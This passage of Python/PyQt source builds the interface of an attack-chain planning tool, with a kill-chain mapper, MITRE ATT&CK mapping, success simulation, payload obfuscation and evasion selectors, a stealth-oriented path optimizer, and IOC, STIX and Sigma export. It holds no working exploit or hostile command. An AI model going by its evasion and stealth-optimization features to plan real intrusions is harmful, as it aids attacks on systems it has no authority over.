        self.show_critical_path_cb.setChecked(True)
        self.show_critical_path_cb.setStyleSheet("color: #ff8800;")
        self.show_critical_path_cb.toggled.connect(self._toggle_critical_path)
        timeline_controls.addWidget(self.show_critical_path_cb)
        
        timeline_controls.addStretch()
        timeline_layout.addLayout(timeline_controls)
        
        # Timeline widget
        self.timeline_widget = AttackTimelineWidget()
        self.timeline_widget.setMinimumHeight(150)
        self.timeline_widget.setMaximumHeight(200)
        timeline_layout.addWidget(self.timeline_widget)
        
        # Timeline summary
        self.timeline_summary = QLabel("üìä Total Duration: 0 min | Critical Path: 0 min")
        self.timeline_summary.setStyleSheet("color: #888; font-size: 10px;")
        timeline_layout.addWidget(self.timeline_summary)
        
        center_layout.addWidget(timeline_group)
        
        # Kill Chain Mapper Widget
        killchain_group = QGroupBox("‚ò†Ô∏è Cyber Kill Chain Mapper")
        killchain_group.setStyleSheet("""
            QGroupBox {
                color: #ff4444;
                border: 1px solid #ff4444;
                margin-top: 5px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        killchain_layout = QVBoxLayout(killchain_group)
        
        self.killchain_widget = KillChainWidget()
        self.killchain_widget.setMinimumHeight(70)
        self.killchain_widget.setMaximumHeight(90)
        self.killchain_widget.phase_clicked.connect(self._on_killchain_phase_clicked)
        killchain_layout.addWidget(self.killchain_widget)
        
        center_layout.addWidget(killchain_group)
        
        content.addWidget(center_panel)
        
        # Right - Properties with TABBED interface to reduce layout warnings
        right_panel = QFrame()
        right_panel.setStyleSheet("background: #0a0a0a;")
        right_layout = QVBoxLayout(right_panel)
        
        props_title = QLabel("‚öôÔ∏è Node Properties")
        props_title.setStyleSheet("color: #00ff00; font-weight: bold; font-size: 14px;")
        right_layout.addWidget(props_title)
        
        # Create tabbed interface for right panel
        self.right_tabs = QTabWidget()
        self.right_tabs.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #333;
                background: #0a0a0a;
            }
            QTabBar::tab {
                background: #1a1a1a;
                color: #888;
                padding: 4px 8px;
                border: 1px solid #333;
                border-bottom: none;
                min-width: 50px;
                font-size: 10px;
            }
            QTabBar::tab:selected {
                background: #0a0a0a;
                color: #00ff00;
                border-bottom: 2px solid #00ff00;
            }
            QTabBar::tab:hover {
                color: #00ff00;
            }
        """)
        
        # Tab 1: Node Properties
        props_tab = QWidget()
        props_tab_layout = QVBoxLayout(props_tab)
        props_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # Property fields container
        self.props_container = QFrame()
        self.props_container.setStyleSheet("""
            QFrame {
                background: #1a1a1a;
                border: 1px solid #333;
                border-radius: 4px;
            }
        """)
        self.props_layout = QVBoxLayout(self.props_container)
        self.props_layout.setContentsMargins(12, 12, 12, 12)
        self.props_layout.setSpacing(8)
        
        self.no_select_label = QLabel("Click a node to view/edit properties\n\nüí° Tips:\n‚Ä¢ Drag nodes to reposition\n‚Ä¢ Press Delete to remove\n‚Ä¢ Double-click exploit to add")
        self.no_select_label.setStyleSheet("color: #666; padding: 10px;")
        self.no_select_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.no_select_label.setWordWrap(True)
        self.props_layout.addWidget(self.no_select_label)
        
        # Node properties (hidden by default)
        self.prop_widgets = {}
        
        # Node name
        self.prop_name_label = QLabel("Name:")
        self.prop_name_label.setStyleSheet("color: #888; font-size: 11px;")
        self.prop_name = QLineEdit()
        self.prop_name.setStyleSheet("""
            QLineEdit {
                background: #0a0a0a;
                color: #00ff00;
                border: 1px solid #333;
                padding: 6px;
                border-radius: 4px;
            }
        """)
        self.prop_name.textChanged.connect(self._on_prop_name_changed)
        
        # Node type
        self.prop_type_label = QLabel("Type:")
        self.prop_type_label.setStyleSheet("color: #888; font-size: 11px;")
        self.prop_type = QComboBox()
        self.prop_type.addItems(['recon', 'exploit', 'payload', 'persistence', 'exfil'])
        self.prop_type.setStyleSheet("""
            QComboBox {
                background: #0a0a0a;
                color: #00ff00;
                border: 1px solid #333;
                padding: 6px;
                border-radius: 4px;
            }
        """)
        self.prop_type.currentTextChanged.connect(self._on_prop_type_changed)
        
        # Node ID (read-only)
        self.prop_id_label = QLabel("ID:")
        self.prop_id_label.setStyleSheet("color: #888; font-size: 11px;")
        self.prop_id = QLabel()
        self.prop_id.setStyleSheet("color: #555; font-size: 10px;")
        
        # Position
        self.prop_pos_label = QLabel("Position:")
        self.prop_pos_label.setStyleSheet("color: #888; font-size: 11px;")
        self.prop_pos = QLabel()
        self.prop_pos.setStyleSheet("color: #555; font-size: 10px;")
        
        # Delete button
        self.delete_node_btn = QPushButton("üóëÔ∏è Delete Node")
        self.delete_node_btn.setStyleSheet("""
            QPushButton {
                background: #330000;
                color: #ff4444;
                border: 1px solid #ff4444;
                padding: 8px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #440000; }
        """)
        self.delete_node_btn.clicked.connect(self._delete_selected_node)
        
        # Add to layout but hide initially
        for widget in [self.prop_name_label, self.prop_name, 
                       self.prop_type_label, self.prop_type,
                       self.prop_id_label, self.prop_id,
                       self.prop_pos_label, self.prop_pos,
                       self.delete_node_btn]:
            self.props_layout.addWidget(widget)
            widget.hide()
        
        self.props_layout.addStretch()
        props_tab_layout.addWidget(self.props_container)
        props_tab_layout.addStretch()
        
        # Add Props tab
        self.right_tabs.addTab(props_tab, "‚öôÔ∏è Props")
        
        # Tab 2: Analysis (Complexity, MITRE, Simulation)
        analysis_tab = QWidget()
        analysis_tab_layout = QVBoxLayout(analysis_tab)
        analysis_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # Wrap in scroll area for many widgets
        analysis_scroll = QScrollArea()
        analysis_scroll.setWidgetResizable(True)
        analysis_scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        analysis_content = QWidget()
        analysis_content_layout = QVBoxLayout(analysis_content)
        
        # Chain Complexity Scoring Panel
        score_group = QGroupBox("üìä Chain Complexity Score")
        score_group.setStyleSheet("""
            QGroupBox {
                color: #ff8800;
                border: 1px solid #ff8800;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        score_layout = QVBoxLayout(score_group)
        
        self.complexity_label = QLabel("Complexity: Low")
        self.complexity_label.setStyleSheet("color: #00ff00; font-weight: bold; font-size: 12px;")
        score_layout.addWidget(self.complexity_label)
        
        self.attack_surface_bar = QProgressBar()
        self.attack_surface_bar.setFormat("Attack Surface: %v%")
        self.attack_surface_bar.setMaximum(100)
        self.attack_surface_bar.setValue(0)
        self.attack_surface_bar.setStyleSheet("""
            QProgressBar {
                background: #1a1a1a; border: 1px solid #333;
                border-radius: 4px; text-align: center; color: #fff;
            }
            QProgressBar::chunk { background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #ff8800, stop:1 #ff4400); }
        """)
        score_layout.addWidget(self.attack_surface_bar)
        
        self.detection_risk_bar = QProgressBar()
        self.detection_risk_bar.setFormat("Detection Risk: %v%")
        self.detection_risk_bar.setMaximum(100)
        self.detection_risk_bar.setValue(0)
        self.detection_risk_bar.setStyleSheet("""
            QProgressBar {
                background: #1a1a1a; border: 1px solid #333;
                border-radius: 4px; text-align: center; color: #fff;
            }
            QProgressBar::chunk { background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #ff0000, stop:1 #ff4444); }
        """)
        score_layout.addWidget(self.detection_risk_bar)
        
        self.est_time_label = QLabel("‚è±Ô∏è Est. Time: 0 min")
        self.est_time_label.setStyleSheet("color: #888; font-size: 11px;")
        score_layout.addWidget(self.est_time_label)
        
        analysis_content_layout.addWidget(score_group)
        
        # MITRE ATT&CK Mapping Panel
        mitre_group = QGroupBox("üéØ MITRE ATT&CK Mapping")
        mitre_group.setStyleSheet("""
            QGroupBox {
                color: #9b59b6;
                border: 1px solid #9b59b6;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        mitre_layout = QVBoxLayout(mitre_group)
        
        self.mitre_list = QListWidget()
        self.mitre_list.setMaximumHeight(100)
        self.mitre_list.setStyleSheet("""
            QListWidget {
                background: #1a1a1a;
                color: #9b59b6;
                border: 1px solid #333;
                border-radius: 4px;
            }
            QListWidget::item { padding: 4px; }
        """)
        mitre_layout.addWidget(self.mitre_list)
        
        self.mitre_coverage = QLabel("Coverage: 0 techniques")
        self.mitre_coverage.setStyleSheet("color: #888; font-size: 10px;")
        mitre_layout.addWidget(self.mitre_coverage)
        
        analysis_content_layout.addWidget(mitre_group)
        
        # Monte Carlo Simulation Panel
        sim_group = QGroupBox("üé≤ Chain Simulation")
        sim_group.setStyleSheet("""
            QGroupBox {
                color: #00ccff;
                border: 1px solid #00ccff;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        sim_layout = QVBoxLayout(sim_group)
        
        sim_runs_layout = QHBoxLayout()
        sim_runs_label = QLabel("Runs:")
        sim_runs_label.setStyleSheet("color: #888;")
        sim_runs_layout.addWidget(sim_runs_label)
        
        self.sim_runs_spin = QSpinBox()
        self.sim_runs_spin.setRange(10, 1000)
        self.sim_runs_spin.setValue(100)
        self.sim_runs_spin.setStyleSheet("""
            QSpinBox {
                background: #1a1a1a; color: #00ccff;
                border: 1px solid #333; padding: 4px;
                border-radius: 4px;
            }
        """)
        sim_runs_layout.addWidget(self.sim_runs_spin)
        
        self.run_sim_btn = QPushButton("‚ñ∂ Run Simulation")
        self.run_sim_btn.setStyleSheet("""
            QPushButton {
                background: #002233; color: #00ccff;
                border: 1px solid #00ccff; padding: 6px 12px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #003344; }
        """)
        self.run_sim_btn.clicked.connect(self._run_simulation)
        sim_runs_layout.addWidget(self.run_sim_btn)
        sim_layout.addLayout(sim_runs_layout)
        
        self.sim_success_bar = QProgressBar()
        self.sim_success_bar.setFormat("Success Rate: %v%")
        self.sim_success_bar.setMaximum(100)
        self.sim_success_bar.setValue(0)
        self.sim_success_bar.setStyleSheet("""
            QProgressBar {
                background: #1a1a1a; border: 1px solid #333;
                border-radius: 4px; text-align: center; color: #fff;
            }
            QProgressBar::chunk { background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #00ccff, stop:1 #00ff88); }
        """)
        sim_layout.addWidget(self.sim_success_bar)
        
        self.sim_bottleneck = QLabel("‚ö†Ô∏è Bottleneck: None")
        self.sim_bottleneck.setStyleSheet("color: #ff8800; font-size: 10px;")
        sim_layout.addWidget(self.sim_bottleneck)
        
        self.sim_avg_steps = QLabel("üìä Avg Steps: 0")
        self.sim_avg_steps.setStyleSheet("color: #888; font-size: 10px;")
        sim_layout.addWidget(self.sim_avg_steps)
        
        analysis_content_layout.addWidget(sim_group)
        analysis_content_layout.addStretch()
        
        # Finalize analysis tab
        analysis_scroll.setWidget(analysis_content)
        analysis_tab_layout.addWidget(analysis_scroll)
        self.right_tabs.addTab(analysis_tab, "üìä Analysis")
        
        # Tab 3: Payloads & Branches
        payload_tab = QWidget()
        payload_tab_layout = QVBoxLayout(payload_tab)
        payload_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # Payload Customization Panel (shows when payload node selected)
        payload_group = QGroupBox("üéØ Payload Customization")
        payload_group.setStyleSheet("""
            QGroupBox {
                color: #ff4444;
                border: 1px solid #ff4444;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        payload_layout = QVBoxLayout(payload_group)
        
        self.payload_type_combo = QComboBox()
        self.payload_type_combo.addItems([f"{v['icon']} {v['name']}" for v in PayloadCustomizer.PAYLOAD_TYPES.values()])
        self.payload_type_combo.setStyleSheet("""
            QComboBox {
                background: #1a1a1a; color: #ff4444;
                border: 1px solid #333; padding: 6px;
                border-radius: 4px;
            }
        """)
        self.payload_type_combo.currentIndexChanged.connect(self._on_payload_type_changed)
        payload_layout.addWidget(self.payload_type_combo)
        
        obfusc_label = QLabel("Obfuscation:")
        obfusc_label.setStyleSheet("color: #888; font-size: 10px;")
        payload_layout.addWidget(obfusc_label)
        
        self.obfuscation_combo = QComboBox()
        self.obfuscation_combo.addItems([f"{name} (+{int(mod*100)}%)" for _, name, mod in PayloadCustomizer.OBFUSCATION_TECHNIQUES])
        self.obfuscation_combo.setStyleSheet("""
            QComboBox {
                background: #1a1a1a; color: #e6edf3;
                border: 1px solid #333; padding: 4px;
                border-radius: 4px;
            }
        """)
        self.obfuscation_combo.currentIndexChanged.connect(self._on_obfuscation_changed)
        payload_layout.addWidget(self.obfuscation_combo)
        
        evasion_label = QLabel("Evasion:")
        evasion_label.setStyleSheet("color: #888; font-size: 10px;")
        payload_layout.addWidget(evasion_label)
        
        self.evasion_combo = QComboBox()
        self.evasion_combo.addItems([f"{name} (+{int(mod*100)}%)" for _, name, mod in PayloadCustomizer.EVASION_TECHNIQUES])
        self.evasion_combo.setStyleSheet("""
            QComboBox {
                background: #1a1a1a; color: #e6edf3;
                border: 1px solid #333; padding: 4px;
                border-radius: 4px;
            }
        """)
        self.evasion_combo.currentIndexChanged.connect(self._on_evasion_changed)
        payload_layout.addWidget(self.evasion_combo)
        
        self.effective_prob_label = QLabel("Effective Success: 70%")
        self.effective_prob_label.setStyleSheet("color: #00ff00; font-weight: bold;")
        payload_layout.addWidget(self.effective_prob_label)
        
        payload_tab_layout.addWidget(payload_group)
        self.payload_group = payload_group
        self.payload_group.hide()  # Hide until payload node selected
        
        # Conditional Branch Panel
        branch_group = QGroupBox("üîÄ Conditional Branches")
        branch_group.setStyleSheet("""
            QGroupBox {
                color: #ffcc00;
                border: 1px solid #ffcc00;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        branch_layout = QVBoxLayout(branch_group)
        
        self.create_success_branch_btn = QPushButton("‚úÖ Create Success Path")
        self.create_success_branch_btn.setStyleSheet("""
            QPushButton {
                background: #1a2a1a; color: #00ff00;
                border: 1px solid #00ff00; padding: 6px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #2a3a2a; }
        """)
        self.create_success_branch_btn.clicked.connect(lambda: self._start_branch_creation('success'))
        branch_layout.addWidget(self.create_success_branch_btn)
        
        self.create_failure_branch_btn = QPushButton("‚ùå Create Failure Path")
        self.create_failure_branch_btn.setStyleSheet("""
            QPushButton {
                background: #2a1a1a; color: #ff4444;
                border: 1px solid #ff4444; padding: 6px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #3a2a2a; }
        """)
        self.create_failure_branch_btn.clicked.connect(lambda: self._start_branch_creation('failure'))
        branch_layout.addWidget(self.create_failure_branch_btn)
        
        self.branch_info = QLabel("Select a node to create branches")
        self.branch_info.setStyleSheet("color: #888; font-size: 10px;")
        self.branch_info.setWordWrap(True)
        branch_layout.addWidget(self.branch_info)
        
        payload_tab_layout.addWidget(branch_group)
        self.branch_group = branch_group
        self.branch_group.hide()  # Hide until node selected
        
        payload_tab_layout.addStretch()
        self.right_tabs.addTab(payload_tab, "üéØ Payload")
        
        # Tab 4: Validation & Resources
        validation_tab = QWidget()
        validation_tab_layout = QVBoxLayout(validation_tab)
        validation_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # Validation
        valid_group = QGroupBox("‚úÖ Validation")
        valid_group.setStyleSheet("""
            QGroupBox {
                color: #00ff00;
                border: 1px solid #333;
                margin-top: 10px;
                padding-top: 10px;
            }
        """)
        valid_layout = QVBoxLayout(valid_group)
        
        self.validation_list = QListWidget()
        self.validation_list.setMaximumHeight(100)
        self.validation_list.setStyleSheet("""
            QListWidget {
                background: #1a1a1a;
                color: #00ff00;
                border: 1px solid #333;
            }
        """)
        valid_layout.addWidget(self.validation_list)
        
        validate_btn = QPushButton("üîç Validate Chain")
        validate_btn.setStyleSheet("""
            QPushButton {
                background: #003300;
                color: #00ff00;
                border: 1px solid #00ff00;
                padding: 8px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #004400; }
        """)
        validate_btn.clicked.connect(self.validate_chain)
        valid_layout.addWidget(validate_btn)
        
        validation_tab_layout.addWidget(valid_group)
        
        # Resource Estimation Panel
        resource_group = QGroupBox("üìä Resource Estimation")
        resource_group.setStyleSheet("""
            QGroupBox {
                color: #00ff88;
                border: 1px solid #00ff88;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        resource_layout = QVBoxLayout(resource_group)
        
        self.resource_time_label = QLabel("‚è±Ô∏è Total Time: 0 min")
        self.resource_time_label.setStyleSheet("color: #e6edf3; font-size: 11px;")
        resource_layout.addWidget(self.resource_time_label)
        
        self.resource_cost_label = QLabel("üí∞ Est. Cost: $0")
        self.resource_cost_label.setStyleSheet("color: #00ff88; font-size: 11px;")
        resource_layout.addWidget(self.resource_cost_label)
        
        self.resource_tools_label = QLabel("üîß Tools: None")
        self.resource_tools_label.setStyleSheet("color: #888; font-size: 10px;")
        self.resource_tools_label.setWordWrap(True)
        resource_layout.addWidget(self.resource_tools_label)
        
        skill_layout = QHBoxLayout()
        skill_label = QLabel("Skill Level:")
        skill_label.setStyleSheet("color: #888;")
        skill_layout.addWidget(skill_label)
        
        self.skill_combo = QComboBox()
        self.skill_combo.addItems(['novice', 'intermediate', 'expert', 'elite'])
        self.skill_combo.setCurrentText('intermediate')
        self.skill_combo.setStyleSheet("""
            QComboBox {
                background: #1a1a1a; color: #00ff88;
                border: 1px solid #333; padding: 4px;
                border-radius: 4px;
            }
        """)
        self.skill_combo.currentTextChanged.connect(self._update_resource_estimation)
        skill_layout.addWidget(self.skill_combo)
        resource_layout.addLayout(skill_layout)
        
        validation_tab_layout.addWidget(resource_group)
        
        # Prerequisites Panel
        prereq_group = QGroupBox("üìã Prerequisites")
        prereq_group.setStyleSheet("""
            QGroupBox {
                color: #ff9900;
                border: 1px solid #ff9900;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        prereq_layout = QVBoxLayout(prereq_group)
        
        self.prereq_list = QListWidget()
        self.prereq_list.setMaximumHeight(80)
        self.prereq_list.setStyleSheet("""
            QListWidget {
                background: #1a1a1a;
                color: #e6edf3;
                border: 1px solid #333;
                border-radius: 4px;
            }
            QListWidget::item { padding: 3px; }
            QListWidget::item:selected { background: #2a1a0a; }
        """)
        self.prereq_list.itemClicked.connect(self._toggle_prerequisite)
        prereq_layout.addWidget(self.prereq_list)
        
        self.prereq_status = QLabel("‚úÖ 0 / 0 satisfied")
        self.prereq_status.setStyleSheet("color: #888; font-size: 10px;")
        prereq_layout.addWidget(self.prereq_status)
        
        validation_tab_layout.addWidget(prereq_group)
        validation_tab_layout.addStretch()
        
        self.right_tabs.addTab(validation_tab, "‚úÖ Valid")
        
        # Tab 5: Intel & Scenarios (Threat Intel, What-If, Optimizer)
        intel_tab = QWidget()
        intel_tab_layout = QVBoxLayout(intel_tab)
        intel_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # Wrap in scroll area
        intel_scroll = QScrollArea()
        intel_scroll.setWidgetResizable(True)
        intel_scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        intel_content = QWidget()
        intel_content_layout = QVBoxLayout(intel_content)
        
        # Threat Intelligence Fusion Panel
        threat_intel_group = QGroupBox("üïµÔ∏è Threat Intel Fusion")
        threat_intel_group.setStyleSheet("""
            QGroupBox {
                color: #e91e63;
                border: 1px solid #e91e63;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        threat_intel_layout = QVBoxLayout(threat_intel_group)
        
        self.threat_match_list = QListWidget()
        self.threat_match_list.setMaximumHeight(70)
        self.threat_match_list.setStyleSheet("""
            QListWidget {
                background: #1a1a1a;
                color: #e6edf3;
                border: 1px solid #333;
                border-radius: 4px;
            }
            QListWidget::item { padding: 3px; }
            QListWidget::item:selected { background: #2a1a2a; }
        """)
        self.threat_match_list.itemClicked.connect(self._on_threat_campaign_clicked)
        threat_intel_layout.addWidget(self.threat_match_list)
        
        self.threat_suggestions = QLabel("üí° Suggestions: Loading...")
        self.threat_suggestions.setStyleSheet("color: #888; font-size: 9px;")
        self.threat_suggestions.setWordWrap(True)
        threat_intel_layout.addWidget(self.threat_suggestions)
        
        intel_content_layout.addWidget(threat_intel_group)
        
        # What-If Scenario Analyzer Panel
        whatif_group = QGroupBox("üé≠ What-If Analyzer")
        whatif_group.setStyleSheet("""
            QGroupBox {
                color: #9b59b6;
                border: 1px solid #9b59b6;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        whatif_layout = QVBoxLayout(whatif_group)
        
        scenario_layout = QHBoxLayout()
        scenario_label = QLabel("Scenario:")
        scenario_label.setStyleSheet("color: #888;")
        scenario_layout.addWidget(scenario_label)
        
        self.scenario_combo = QComboBox()
        self.scenario_combo.addItems([
            "üñ•Ô∏è Unpatched Systems",
            "üõ°Ô∏è EDR/XDR Enabled",
            "üëÅÔ∏è 24/7 SOC Monitoring",
            "üîå Air-Gapped Network",
            "üë§ Insider Threat",
            "üîê Zero Trust Architecture",
        ])
        self.scenario_combo.setStyleSheet("""
            QComboBox {
                background: #1a1a1a; color: #9b59b6;
                border: 1px solid #333; padding: 4px;
                border-radius: 4px;
            }
        """)
        self.scenario_combo.currentIndexChanged.connect(self._run_whatif_analysis)
        scenario_layout.addWidget(self.scenario_combo)
        whatif_layout.addLayout(scenario_layout)
        
        self.whatif_result = QLabel("üìä Select a scenario to analyze")
        self.whatif_result.setStyleSheet("color: #e6edf3; font-size: 10px;")
        self.whatif_result.setWordWrap(True)
        whatif_layout.addWidget(self.whatif_result)
        
        self.whatif_success_bar = QProgressBar()
        self.whatif_success_bar.setFormat("Scenario Success: %v%")
        self.whatif_success_bar.setMaximum(100)
        self.whatif_success_bar.setValue(0)
        self.whatif_success_bar.setMaximumHeight(18)
        self.whatif_success_bar.setStyleSheet("""
            QProgressBar {
                background: #1a1a1a; border: 1px solid #333;
                border-radius: 4px; text-align: center; color: #fff;
                font-size: 9px;
            }
            QProgressBar::chunk { 
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0, 
                    stop:0 #9b59b6, stop:1 #e91e63); 
            }
        """)
        whatif_layout.addWidget(self.whatif_success_bar)
        
        intel_content_layout.addWidget(whatif_group)
        
        # Path Optimizer Panel
        optimizer_group = QGroupBox("üöÄ Attack Path Optimizer")
        optimizer_group.setStyleSheet("""
            QGroupBox {
                color: #00ff88;
                border: 1px solid #00ff88;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        optimizer_layout = QVBoxLayout(optimizer_group)
        
        opt_objective_layout = QHBoxLayout()
        opt_label = QLabel("Objective:")
        opt_label.setStyleSheet("color: #888;")
        opt_objective_layout.addWidget(opt_label)
        
        self.optimizer_objective = QComboBox()
        self.optimizer_objective.addItems([
            "‚ö° Fastest Path",
            "ü•∑ Stealthiest Path",
            "üéØ Most Reliable",
            "‚öñÔ∏è Balanced Approach"
        ])
        self.optimizer_objective.setStyleSheet("""
            QComboBox {
                background: #1a1a1a; color: #00ff88;
                border: 1px solid #333; padding: 4px;
                border-radius: 4px;
            }
        """)
        opt_objective_layout.addWidget(self.optimizer_objective)
        optimizer_layout.addLayout(opt_objective_layout)
        
        self.optimize_btn = QPushButton("üîÑ Optimize Chain")
        self.optimize_btn.setStyleSheet("""
            QPushButton {
                background: #002a2a; color: #00ff88;
                border: 1px solid #00ff88; padding: 6px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #003a3a; }
        """)
        self.optimize_btn.clicked.connect(self._optimize_attack_path)
        optimizer_layout.addWidget(self.optimize_btn)
        
        self.optimizer_result = QLabel("üìä Click to optimize path")
        self.optimizer_result.setStyleSheet("color: #888; font-size: 9px;")
        self.optimizer_result.setWordWrap(True)
        optimizer_layout.addWidget(self.optimizer_result)
        
        intel_content_layout.addWidget(optimizer_group)
        intel_content_layout.addStretch()
        
        # Finalize intel tab
        intel_scroll.setWidget(intel_content)
        intel_tab_layout.addWidget(intel_scroll)
        self.right_tabs.addTab(intel_tab, "üïµÔ∏è Intel")
        
        # Tab 6: Tools (IOC Generator, Version Control, Output)
        tools_tab = QWidget()
        tools_tab_layout = QVBoxLayout(tools_tab)
        tools_tab_layout.setContentsMargins(5, 5, 5, 5)
        
        # IOC Generator Panel
        ioc_group = QGroupBox("üîç IOC Generator")
        ioc_group.setStyleSheet("""
            QGroupBox {
                color: #ff6b6b;
                border: 1px solid #ff6b6b;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        ioc_layout = QVBoxLayout(ioc_group)
        
        ioc_btn_layout = QHBoxLayout()
        
        self.generate_iocs_btn = QPushButton("üîç Generate IOCs")
        self.generate_iocs_btn.setStyleSheet("""
            QPushButton {
                background: #2a1a1a; color: #ff6b6b;
                border: 1px solid #ff6b6b; padding: 5px 8px;
                border-radius: 4px; font-size: 10px;
            }
            QPushButton:hover { background: #3a2a2a; }
        """)
        self.generate_iocs_btn.clicked.connect(self._generate_iocs)
        ioc_btn_layout.addWidget(self.generate_iocs_btn)
        
        self.export_stix_btn = QPushButton("üìÑ STIX")
        self.export_stix_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a; color: #888;
                border: 1px solid #444; padding: 5px 8px;
                border-radius: 4px; font-size: 10px;
            }
            QPushButton:hover { background: #252525; color: #ff6b6b; }
        """)
        self.export_stix_btn.clicked.connect(self._export_stix)
        ioc_btn_layout.addWidget(self.export_stix_btn)
        
        self.export_sigma_btn = QPushButton("üìã Sigma")
        self.export_sigma_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a; color: #888;
                border: 1px solid #444; padding: 5px 8px;
                border-radius: 4px; font-size: 10px;
            }
            QPushButton:hover { background: #252525; color: #ff6b6b; }
        """)
        self.export_sigma_btn.clicked.connect(self._export_sigma)
        ioc_btn_layout.addWidget(self.export_sigma_btn)
        
        ioc_layout.addLayout(ioc_btn_layout)
        
        self.ioc_count_label = QLabel("üìä 0 IOCs generated")
        self.ioc_count_label.setStyleSheet("color: #888; font-size: 9px;")
        ioc_layout.addWidget(self.ioc_count_label)
        
        tools_tab_layout.addWidget(ioc_group)
        
        # Version Control Panel
        version_group = QGroupBox("üìö Version Control")
        version_group.setStyleSheet("""
            QGroupBox {
                color: #4fc3f7;
                border: 1px solid #4fc3f7;
                margin-top: 10px;
                padding-top: 10px;
                border-radius: 5px;
            }
        """)
        version_layout = QVBoxLayout(version_group)
        
        version_btn_layout = QHBoxLayout()
        
        self.save_version_btn = QPushButton("üíæ Save Version")
        self.save_version_btn.setStyleSheet("""
            QPushButton {
                background: #1a2a3a; color: #4fc3f7;
                border: 1px solid #4fc3f7; padding: 5px 8px;
                border-radius: 4px; font-size: 10px;
            }
            QPushButton:hover { background: #2a3a4a; }
        """)
        self.save_version_btn.clicked.connect(self._save_chain_version)
        version_btn_layout.addWidget(self.save_version_btn)
        
        self.view_history_btn = QPushButton("üìú History")
        self.view_history_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a; color: #888;
                border: 1px solid #444; padding: 5px 8px;
                border-radius: 4px; font-size: 10px;
            }
            QPushButton:hover { background: #252525; color: #4fc3f7; }
        """)
        self.view_history_btn.clicked.connect(self._view_version_history)
        version_btn_layout.addWidget(self.view_history_btn)
        
        version_layout.addLayout(version_btn_layout)
        
        self.version_label = QLabel("üìä No versions saved")
        self.version_label.setStyleSheet("color: #888; font-size: 9px;")
        version_layout.addWidget(self.version_label)
        
        tools_tab_layout.addWidget(version_group)
        
        # Output
        output_group = QGroupBox("üìã Chain Output")
        output_group.setStyleSheet("""
            QGroupBox {
                color: #00ff00;
                border: 1px solid #333;
                margin-top: 10px;
                padding-top: 10px;
            }
        """)
        output_layout = QVBoxLayout(output_group)
        
        self.output_text = QTextEdit()
        self.output_text.setMaximumHeight(120)
        self.output_text.setReadOnly(True)
        self.output_text.setStyleSheet("""
            QTextEdit {
                background: #0a0a0a;
                color: #00ff00;
                border: 1px solid #333;
                font-family: Consolas;
            }
        """)
        output_layout.addWidget(self.output_text)
        
        tools_tab_layout.addWidget(output_group)
        tools_tab_layout.addStretch()
        
        self.right_tabs.addTab(tools_tab, "üîß Tools")
        
        # Add tabs to right layout
        right_layout.addWidget(self.right_tabs, 1)
        
        content.addWidget(right_panel)
        content.setSizes([250, 500, 250])
        
        layout.addWidget(content, 1)
    
    def _init_connections(self):
        """Initialize signal connections and keyboard shortcuts"""
        self.canvas.node_clicked.connect(self._on_node_selected)
        self.canvas.node_deleted.connect(self._on_node_deleted)
        
        # Keyboard shortcuts
        self._setup_shortcuts()
    
    def _on_node_selected(self, node: dict):
        """Handle node selection - show properties"""
        if not node:
            # No node selected - show tips
            self.no_select_label.show()
            for widget in [self.prop_name_label, self.prop_name,
                           self.prop_type_label, self.prop_type,
                           self.prop_id_label, self.prop_id,
                           self.prop_pos_label, self.prop_pos,
                           self.delete_node_btn]:
                widget.hide()
            self.payload_group.hide()
            self.branch_group.hide()
            self._current_node = None
            return
        
        # Handle branch creation click
        if self.canvas.creating_connection:
            source_id = self.canvas.connection_source
            target_id = node.get('id')
            if source_id and target_id and source_id != target_id:
                self.canvas.add_branch(source_id, target_id, self.canvas.connection_type)
                self.output_text.append(f"‚úÖ Created {self.canvas.connection_type} branch: {source_id} ‚Üí {target_id}")
                self.branch_info.setText(f"Branch created!")
            self.canvas.cancel_branch_creation()
            return
        
        # Show properties
        self.no_select_label.hide()
        for widget in [self.prop_name_label, self.prop_name,
                       self.prop_type_label, self.prop_type,
                       self.prop_id_label, self.prop_id,
                       self.prop_pos_label, self.prop_pos,
                       self.delete_node_btn]:
            widget.show()
        
        # Block signals while updating
        self.prop_name.blockSignals(True)
        self.prop_type.blockSignals(True)
        
        self.prop_name.setText(node.get('name', ''))
        self.prop_type.setCurrentText(node.get('type', 'exploit'))
        self.prop_id.setText(node.get('id', ''))
        self.prop_pos.setText(f"({node.get('x', 0)}, {node.get('y', 0)})")
        
